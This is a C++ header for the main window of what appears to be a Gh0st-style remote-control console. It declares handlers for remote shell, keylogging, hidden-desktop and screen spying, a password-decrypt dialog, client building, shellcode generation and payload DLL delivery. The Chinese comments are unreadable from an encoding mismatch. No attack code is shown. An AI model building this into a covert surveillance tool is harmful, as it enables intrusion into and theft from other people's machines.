
// 2015RemoteDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"

//////////////////////////////////////////////////////////////////////////
// ����Ϊ��������ʹ��

// �Ƿ����˳����ض�ʱҲ�˳��ͻ���
#define CLIENT_EXIT_WITH_SERVER 0

typedef struct DllInfo {
	std::string Name;
	Buffer* Data;
	~DllInfo() {
		SAFE_DELETE(Data);
	}
}DllInfo;

#define ID_DYNAMIC_MENU_BASE 36500

//////////////////////////////////////////////////////////////////////////
#include <unordered_map>
#include <fstream>
#include "CGridDialog.h"

enum {
	MAP_NOTE,
	MAP_LOCATION,
	MAP_LEVEL,
};

struct _ClientValue
{
	char Note[64];
	char Location[64];
	char Level;
	char Reserved[127]; // Ԥ��
	_ClientValue() {
		memset(this, 0, sizeof(_ClientValue));
	}
	_ClientValue(const CString& loc, const CString& s) {
		memset(this, 0, sizeof(_ClientValue));
		strcpy_s(Note, s.GetString());
		strcpy_s(Location, loc.GetString());
	}
	void UpdateNote(const CString& s) {
		strcpy_s(Note, s.GetString());
	}
	void UpdateLocation(const CString& loc) {
		strcpy_s(Location, loc.GetString());
	}
	void UpdateLevel(int level) {
		Level = level;
	}
	const char* GetNote() const {
		return Note;
	}
	const char* GetLocation() const {
		return Location;
	}
	int GetLevel() const {
		return Level;
	}
	int GetLength() const {
		return sizeof(_ClientValue);
	}
};

typedef uint64_t ClientKey;

typedef _ClientValue ClientValue;

typedef  std::unordered_map<ClientKey, ClientValue> ComputerNoteMap;

// ���� unordered_map ���ļ�
void SaveToFile(const ComputerNoteMap& data, const std::string& filename);

// ���ļ���ȡ unordered_map ����
void LoadFromFile(ComputerNoteMap& data, const std::string& filename);

//////////////////////////////////////////////////////////////////////////

enum
{
	PAYLOAD_DLL_X86 = 0,			// 32λ DLL
	PAYLOAD_DLL_X64 = 1,			// 64λ DLL
	PAYLOAD_MAXTYPE
};

// CMy2015RemoteDlg �Ի���
class CMy2015RemoteDlg : public CDialogEx
{
protected:
	ComputerNoteMap m_ClientMap;
	CString GetClientMapData(ClientKey key, int typ) {
		EnterCriticalSection(&m_cs);
		auto f = m_ClientMap.find(key);
		CString r;
		if (f != m_ClientMap.end()) {
			switch (typ)
			{
			case MAP_NOTE:
				r = f->second.GetNote();
				break;
			case MAP_LOCATION:
				r = f->second.GetLocation();
				break;
			default:
				break;
			}
		}
		LeaveCriticalSection(&m_cs);
		return r;
	}
	void SetClientMapData(ClientKey key, int typ, const char* value) {
		EnterCriticalSection(&m_cs);
		switch (typ)
		{
		case MAP_NOTE:
			m_ClientMap[key].UpdateNote(value);
			break;
		case MAP_LOCATION:
			m_ClientMap[key].UpdateLocation(value);
			break;
		default:
			break;
		}
		LeaveCriticalSection(&m_cs);
	}
	// ����
public:
	CMy2015RemoteDlg(CWnd* pParent = NULL);	// ��׼���캯��
	~CMy2015RemoteDlg();
	// �Ի�������
	enum { IDD = IDD_MY2015REMOTE_DIALOG };
protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��
	// ʵ��
protected:
	HICON m_hIcon;
	void* m_tinyDLL;
	std::string m_superPass;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	void SortByColumn(int nColumn);
	afx_msg VOID OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult);
	static int CALLBACK CompareFunction(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);
	template<class T, int id, int Show = SW_SHOW> LRESULT OpenDialog(WPARAM wParam, LPARAM lParam)
	{
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)lParam;
		T* Dlg = new T(this, ContextObject->GetServer(), ContextObject);
		BOOL isGrid = id == IDD_DIALOG_SCREEN_SPY;
		BOOL ok = (isGrid&&m_gridDlg) ? m_gridDlg->HasSlot() : FALSE;
		Dlg->Create(id, ok ? m_gridDlg : GetDesktopWindow());
		Dlg->ShowWindow(Show);
		if (ok) {
			m_gridDlg->AddChild((CDialog*)Dlg);
			LONG style = ::GetWindowLong(Dlg->GetSafeHwnd(), GWL_STYLE);
			style &= ~(WS_CAPTION | WS_SIZEBOX);  // ȥ���������͵�����С
			::SetWindowLong(Dlg->GetSafeHwnd(), GWL_STYLE, style);
			::SetWindowPos(Dlg->GetSafeHwnd(), nullptr, 0, 0, 0, 0,
				SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
			m_gridDlg->ShowWindow(isGrid ? SW_SHOWMAXIMIZED : SW_HIDE);
		}

		ContextObject->hWnd = Dlg->GetSafeHwnd();
		ContextObject->hDlg = Dlg;

		return 0;
	}
	VOID InitControl();             //��ʼ�ؼ�
	VOID TestOnline();              //���Ժ���
	VOID AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,
		CString ver, CString startTime, const std::vector<std::string>& v, CONTEXT_OBJECT* ContextObject);
	VOID ShowMessage(CString strType, CString strMsg);
	VOID CreatStatusBar();
	VOID CreateToolBar();
	VOID CreateNotifyBar();
	VOID CreateSolidMenu();
	int m_nMaxConnection;
	BOOL Activate(const std::string& nPort, int nMaxConnection, const std::string& method);
	void UpdateActiveWindow(CONTEXT_OBJECT* ctx);
	void SendMasterSettings(CONTEXT_OBJECT* ctx);
	VOID SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit);
	Buffer* m_ServerDLL[PAYLOAD_MAXTYPE];
	Buffer* m_ServerBin[PAYLOAD_MAXTYPE];
	MasterSettings m_settings;
	static BOOL CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
	static BOOL CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
	VOID MessageHandle(CONTEXT_OBJECT* ContextObject);
	VOID SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
	// ��ʾ�û�������Ϣ
	CWnd* m_pFloatingTip = nullptr;
	CListCtrl  m_CList_Online;
	CListCtrl  m_CList_Message;

	void DeletePopupWindow();

	CStatusBar m_StatusBar;          //״̬��
	CTrueColorToolBar m_ToolBar;
	CGridDialog * m_gridDlg = NULL;
	std::vector<DllInfo*> m_DllList;
	NOTIFYICONDATA  m_Nid;
	HANDLE m_hExit;
	CRITICAL_SECTION m_cs;
	BOOL       isClosed;
	CMenu	   m_MainMenu;
	CBitmap m_bmOnline[15];
	uint64_t m_superID;
	enum {
		STATUS_UNKNOWN = -1,
		STATUS_RUN = 0,
		STATUS_STOP = 1,
		STATUS_EXIT = 2,
	};
	HANDLE m_hFRPThread = NULL;
	int m_frpStatus = STATUS_RUN;
	static DWORD WINAPI StartFrpClient(LPVOID param);
	void ApplyFrpSettings();
	bool CheckValid(int trail = 14);
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnClose();
			void Release();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineMessage();
	afx_msg void OnOnlineDelete();
	afx_msg void OnOnlineUpdate();
	afx_msg void OnAbout();
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyExit();
	afx_msg void OnMainSet();
	afx_msg void OnMainExit();
	afx_msg void OnOnlineCmdManager();
	afx_msg void OnOnlineProcessManager();
	afx_msg void OnOnlineWindowManager();
	afx_msg void OnOnlineDesktopManager();
	afx_msg void OnOnlineAudioManager();
	afx_msg void OnOnlineVideoManager();
	afx_msg void OnOnlineFileManager();
	afx_msg void OnOnlineServerManager();
	afx_msg void OnOnlineRegisterManager();
	afx_msg VOID OnOnlineKeyboardManager();
	afx_msg void OnOnlineBuildClient();
	afx_msg LRESULT OnUserToOnlineList(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnUserOfflineMsg(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenTalkDialog(WPARAM wPrarm,LPARAM lParam);
	afx_msg LRESULT OnOpenShellDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenAudioDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenServicesDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnHandleMessage(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenKeyboardDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenHideScreenDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenMachineManagerDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenProxyDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenChatDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenDecryptDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenFileMgrDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenDrawingBoard(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT UPXProcResult(WPARAM wParam, LPARAM lParam);
	afx_msg BOOL OnHelpInfo(HELPINFO* pHelpInfo);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnOnlineShare();
	afx_msg void OnToolAuth();
	afx_msg void OnToolGenMaster();
	afx_msg void OnMainProxy();
	afx_msg void OnOnlineHostnote();
	afx_msg void OnHelpImportant();
	afx_msg void OnHelpFeedback();
	afx_msg void OnDynamicSubMenu(UINT nID);
	afx_msg void OnOnlineVirtualDesktop();
	afx_msg void OnOnlineGrayDesktop();
	afx_msg void OnOnlineRemoteDesktop();
	afx_msg void OnOnlineH264Desktop();
	afx_msg void OnWhatIsThis();
	afx_msg void OnOnlineAuthorize();
	void OnListClick(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnOnlineUnauthorize();
	afx_msg void OnToolRequestAuth();
	afx_msg LRESULT OnPasswordCheck(WPARAM wParam, LPARAM lParam);
	afx_msg void OnToolInputPassword();
	afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam);
	afx_msg void OnToolGenShellcode();
	afx_msg void OnOnlineAssignTo();
	afx_msg void OnNMCustomdrawMessage(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnOnlineAddWatch();
	afx_msg void OnNMCustomdrawOnline(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnOnlineRunAsAdmin();
	afx_msg LRESULT OnShowErrMessage(WPARAM wParam, LPARAM lParam);
	afx_msg void OnMainWallet();
};
